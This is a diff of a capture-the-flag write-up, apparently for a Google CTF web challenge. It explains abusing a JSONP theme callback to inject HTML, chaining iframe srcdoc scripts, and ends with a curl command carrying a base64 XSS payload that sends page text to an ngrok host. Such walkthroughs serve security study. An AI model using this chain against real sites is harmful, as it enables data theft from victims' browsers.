@@ -150,7 +150,7 @@ A request to `/theme?cb=set_dark_theme` returns the following
 set_dark_theme({"version":"b1.13.7","timestamp":1598252951983})
 ```
 
-Doing some testing, it seems that the route supports the following regex for the callback name: `[A-Za-z0-9_.]`.  This should allow us to call a single function,
+Doing some testing, it seems that the route supports the following regex for the callback name: `[A-Za-z0-9_.=]`.  This should allow us to call a single function,
 and then set at least one value to another.  This seems like a good place to start.  Lets try and override this callback value.
 
 ## Overriding the theme callback
@@ -174,8 +174,8 @@ If everything went properly, you should get an alert with `[object Object]`.
 ## Abusing the callback
 
 We now have the ability to set one value to another.  We can control things like `window.name`, `location.hash`, and `location.search`, and if we append
-`toString` we can successfully assign an almost arbitrary string to what we want, since `toString` will just ignore the theme object.  This should
-allow us to set arbitrary HTML with the following payload:
+`toString` we can successfully assign an almost arbitrary string to what we want, since `toString` will just ignore the theme object, returning the
+unaltered string.  This should allow us to set arbitrary HTML with the following payload:
 
 ```json
 {
@@ -194,7 +194,7 @@ executed when inserted via `innerHTML`.
 ## Multiple callbacks
 
 After a *long* chain of trial and error, we came to a solution that allowed us to chain multiple callbacks.  An `<iframe>` with a `srcdoc` attribute
-allowed us to bypass the `innerHTML` `<script>` tag restriction, because you can access the parent DOM via `window.top`:
+allowed us to bypass the `innerHTML` `<script>` tag restriction that prevents execution, allowing for including multiple `/theme?cb=...` scripts.
 
 ```json
 {
@@ -247,13 +247,12 @@ Now all that was left was to craft the payload, test it and send it to the admin
 In order, this payload should overwrite the contents of the `<nav>` element on the page with our arbitrary HTML containing the two additional callback
 executions.  The first grabs the `innerText` of the whole page, and places it in our concatenation `<div>`.  The second callback retrieves the
 `innerText` of the `concat` form which should be our URL plus the text of the page, and then sets the browser location to make the request.  We
-should then be able to grab the contents of the page by looking at the request sent to our local http server.  Testing it on our own browser, we find that it works.
-It sometimes fails due to the script loading order, but succeeds most of the time.
+should then be able to grab the contents of the page by looking at the request sent to our local http server.  Testing it on our own browser, we find that it works.  It sometimes fails due to the response times from the server and the script loading order, but succeeds most of the time.
 
 ### Getting the note id
 
-Lets incorporate our payload into the exploit for the previous pasteurization challenge.  We'll need to set `window.name` and then change the `location.href`
-value to the page we want the text of.  If you remember, certain characters are escaped, so lets base64 encode the JSON string.  Don't forget to url encode as well.
+Lets incorporate our payload into the exploit for the previous pasteurization challenge.  We'll need to set `window.name`(since it persists across pages) and then 
+change the `location.href` value to the `littlethings.web.ctfcompetition.com` page we want the text of.  If you remember, certain characters are escaped, so lets base64 encode the JSON string.  Don't forget to url encode as well.
 
 ```sh
 curl 'https://pasteurize.web.ctfcompetition.com/' --data-raw 'content[]=;window.name=atob(`eyJfX3Byb3RvX18iOiB7fSwidGhlbWUiOiB7ImNiIjogImRvY3VtZW50LmJvZHkuZmlyc3RFbGVtZW50Q2hpbGQuaW5uZXJIVE1MPXdpbmRvdy5uYW1lLnRvU3RyaW5nIn0sImltZyI6ICIvIiwicGF5bG9hZCI6IFsiPGZvcm0gaWQ9J2NvbmNhdCc%2BaHR0cHM6Ly8wYjc2NjBhMzUxNTQubmdyb2suaW8vPzxkaXY%2BPC9kaXY%2BPC9mb3JtPiIsIjxpZnJhbWUgc3JjZG9jPSc8c2NyaXB0IHNyYz0vdGhlbWU%2FY2I9d2luZG93LnRvcC5jb25jYXQuZmlyc3RFbGVtZW50Q2hpbGQuaW5uZXJUZXh0PXdpbmRvdy50b3AuZG9jdW1lbnQuYm9keS5pbm5lclRleHQudG9TdHJpbmc%2BPC9zY3JpcHQ%2BJz48L2lmcmFtZT4iLCI8aWZyYW1lIHNyY2RvYz0nPHNjcmlwdCBzcmM9L3RoZW1lP2NiPXdpbmRvdy50b3AubG9jYXRpb24uaHJlZj13aW5kb3cudG9wLmNvbmNhdC5pbm5lclRleHQudG9TdHJpbmc%2BPC9zY3JpcHQ%2BJz48L2lmcmFtZT4iXX0%3D`);debugger;if(!window.skipIt)location.href=`https://littlethings.web.ctfcompetition.com/note?__debug__`;//'
